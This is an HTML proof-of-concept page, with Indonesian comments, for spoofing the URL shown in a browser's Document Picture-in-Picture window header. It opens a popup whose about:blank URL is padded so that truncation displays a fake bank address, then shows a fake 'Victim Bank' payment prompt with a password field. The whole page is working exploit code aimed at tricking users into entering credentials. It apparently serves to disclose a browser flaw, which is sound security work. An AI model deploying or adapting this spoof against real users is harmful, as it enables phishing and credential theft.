<!DOCTYPE html>
<html lang="en">
<head>
    <title>Document PiP Header Spoof PoC</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    <script>
        // Dua klik: klik pertama membuka popup about:blank#<payload>, klik kedua memicu requestWindow di dalam popup
        let step = 0;

        document.addEventListener('DOMContentLoaded', () => {
            document.body.addEventListener('click', async () => {
                step++;

                if (step === 1) {
                    // Klik pertama: buka popup, fragment berisi URL palsu
                    // about:blank memiliki host kosong, getUrlString() akan fallback ke full spec
                    // TruncateAt.START membuat header hanya menampilkan …https://victim-bank.com/pay
                    const payload = '' + 'a'.repeat(300) + '?.--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------https://google.com/pay';
                    const popup = window.open('---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------google.com#' + payload, 'poc', 'width=400,height=400');

                    // Isi popup dengan tombol penipuan (menggunakan DOM API, bukan document.write, agar URL tidak di-reset)
                    popup.document.body.innerHTML = `
                        <h1 style="color:#333;">Verifikasi Pembayaran</h1>
                        <p>Silakan ketuk untuk melanjutkan</p>
                        <button id="pipBtn" style="padding:20px;font-size:18px;">Konfirmasi</button>
                    `;

                    // Klik kedua terjadi di dalam popup
                    popup.document.getElementById('pipBtn').addEventListener('click', async () => {
                        try {
                            // Meminta Document PiP (memerlukan gesture pengguna)
                            const pipWin = await documentPictureInPicture.requestWindow({
                                width: 220,
                                height: 300
                            });

                            // Menulis konten penipuan ke dalam jendela PiP
                            pipWin.document.body.innerHTML = `
                                <h2 style="color:red;">Victim Bank</h2>
                                <p>Verifikasi pembayaran $500.00</p>
                                <input type="password" placeholder="Kata sandi" style="width:100%;">
                                <button>Konfirmasi</button>
                            `;
                        } catch (e) {
                            console.log('PiP gagal:', e.message);
                        }
                    });
                }
            });
        });
    </script>
</head>
<body style="margin:0;padding:0;">
    <br><br><br>
    <center>
        <h1>Ketuk di mana saja untuk memulai (dua kali)</h1>
        <p style="color:#666;">Klik pertama: buka popup · Klik kedua: picu PiP</p>
    </center>
</body>
</html>
